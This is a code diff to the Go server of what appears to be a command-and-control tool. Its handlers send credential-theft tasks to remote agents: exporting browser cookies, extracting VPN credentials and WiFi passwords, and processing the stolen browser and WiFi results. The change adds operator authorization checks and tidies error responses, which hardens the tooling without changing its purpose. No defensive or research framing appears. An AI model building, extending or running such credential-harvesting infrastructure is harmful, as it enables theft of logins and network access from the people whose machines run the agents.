@@ -1,4 +1,4 @@
-package server
+﻿package server
 
 import (
 	"fmt"
@@ -13,6 +13,9 @@ import (
 
 // handleCookieExport dispatches cookie_export task to the agent.
 func (s *Server) handleCookieExport(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	browser := c.PostForm("browser")
 	if browser == "" {
@@ -26,7 +29,7 @@ func (s *Server) handleCookieExport(c *gin.Context) {
 	}
 	task, err := s.createTask(id, "cookie_export", browser, "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	s.LogAuditRecord(c, "cookie_export", "agent", id, "Cookie export: "+browser, true, nil)
@@ -35,13 +38,16 @@ func (s *Server) handleCookieExport(c *gin.Context) {
 
 // handleVpnCreds dispatches vpn_creds task to the agent.
 func (s *Server) handleVpnCreds(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
 	task, err := s.createTask(id, "vpn_creds", "", "", "", "", 0, 0)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	s.LogAuditRecord(c, "vpn_creds", "agent", id, "VPN credential extraction", true, nil)
@@ -50,6 +56,9 @@ func (s *Server) handleVpnCreds(c *gin.Context) {
 
 // handleWifiCreds handles WiFi credential extraction
 func (s *Server) handleWifiCreds(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	user := c.GetString("username")
 	agentID := c.Param("id")
 
@@ -65,7 +74,7 @@ func (s *Server) handleWifiCreds(c *gin.Context) {
 	}
 
 	if err := s.db.Create(&task).Error; err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create WiFi credential extraction task"})
+		respondError(c, http.StatusInternalServerError, "failed to create WiFi credential extraction task")
 		return
 	}
 
@@ -91,7 +100,7 @@ func (s *Server) handleProcessBrowserResult(c *gin.Context) {
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
+		respondError(c, http.StatusBadRequest, "invalid request")
 		return
 	}
 
@@ -137,7 +146,7 @@ func (s *Server) handleProcessWifiResult(c *gin.Context) {
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
+		respondError(c, http.StatusBadRequest, "invalid request")
 		return
 	}
 
